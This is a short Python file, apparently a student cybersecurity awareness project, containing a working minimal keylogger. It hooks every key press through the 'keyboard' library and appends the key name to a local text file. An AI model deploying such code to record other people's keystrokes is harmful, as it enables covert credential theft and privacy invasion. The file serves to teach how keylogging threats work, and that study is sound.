# Keylogger Project using Python
# Project developed by Bilal Ahmad 2021-cs-216 and Abdullah 2021-cs-191
# The purpose of this project is to learn security threats present there in digital world that even a key pressed by us by
# A user is also noted by Maksoos Loogs so to be aware and not trust too much. The mouse movement is also controlled by these kind
# of people. As Cyber Security Students this project helps us in awarness and a Threat kind known as keyLogging

# imported Keyboard Library which is installed before.
import keyboard

# Log file where i save the data or key strokes pressed by me 
logFile = 'C:/KeyStroke_file.txt'


# function for on key press as a key is pressed the event is triggered so it gets what is pressed and save or append it to the Log_file
def onKey_press(event):
    with open(logFile, 'a') as f:
        f.write('{}\n'.format(event.name))


# The Function is called using Keyboard.on_Press method
keyboard.on_press(onKey_press)

# here we wait for key stroke as the wait function comes from keyboard library for us
keyboard.wait()